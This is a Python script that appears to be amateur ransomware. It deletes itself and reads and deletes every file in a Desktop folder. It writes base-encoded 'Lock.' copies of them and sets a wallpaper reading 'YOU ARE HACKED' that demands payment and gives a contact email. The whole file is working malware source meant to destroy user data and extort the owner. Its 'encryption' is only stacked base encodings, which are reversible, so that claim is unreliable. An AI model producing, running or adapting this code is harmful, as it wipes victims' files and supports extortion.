# Import System
import ctypes,os, requests, sys,time,socket,random,base64
from PIL import Image, ImageDraw, ImageFont

os.remove(__file__)

# Scan Files
def scan(path):
    allFiles = []
    for home, sub_files, file_list_s in os.walk(path):
        for name_files in file_list_s:
            if "Lock." in name_files:
                print("Skip Files Lock.")
                continue
            allFiles.append(os.path.join(home, name_files))
    return allFiles

#Path Files
path_files = os.environ['USERPROFILE'] + '\Desktop\lol'

#Encryption
openFiles = scan(path_files)
for file_os in openFiles:
     #Read Files
     files = open(file_os, "rb")
     Data_Text = files.read()
     files.close()
     print(f'Reading . . .')

     #Files Remove 
     os.remove(file_os)
     print(f'Remove files . . .')
     
     # Base Encode (b32hex)
     encodedBytes = base64.b16encode(bytes(Data_Text))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b32encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b64encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     encodedBytes = base64.b85encode(bytes(encodedBytes))
     encodedBytes = base64.b32hexencode(bytes(encodedBytes))
     print(f'Encryption BASE . . .')
     encodedStr = str(encodedBytes,'utf-8')

     print(f'[{encodedBytes}] BASE Encryption . . .')
     
     # Write Files
     output = os.path.join(os.path.dirname(file_os), "Lock." + os.path.basename(file_os))
     files2 = open(output, "w")
     files2.write(encodedStr)
     files2.close()

     print(f'[{str(file_os)}] Encryption Path Files . . .')

#Random Files Name
char_setting = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
char_file = ''
for bit_files in range(15):
    char_file += random.choice(char_setting)

print(f'Write Files . . .')

#Create Wallpaper Files
IMG_wallpaper = char_file + '.png'
Img = Image.new("RGB", (2050, 1050))
Canvas= ImageDraw.Draw(Img)
font = ImageFont.truetype("arial", int(55))
Canvas.text((10,10),(f"""
                                               YOU ARE HACKED!\n
                ALL YOUR PERSONAL FILES HAVE BEEN ENCRYPTED!\n
                IF YOU WANT RESTORE YOUR DATA YOU HAVE TO PAY!\n
            CONTACT US: rans0msupport@gmail.com\n
            REMEMBER! YOU CAN’T RESTORE YOUR DATA
            WITHOUT OUR DECRYPTOR!!!"""),fill=(255,0,0),font=font)                                                  
Img.save(IMG_wallpaper)
# Set Wallpaper
ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{os.getcwd()}\\{IMG_wallpaper}' , 0)
print(f'Select Wallpaper . . .')
time.sleep(0.3)
# Remove Wallpaper
os.remove(IMG_wallpaper)
print(f'Remove Wallpaper . . .')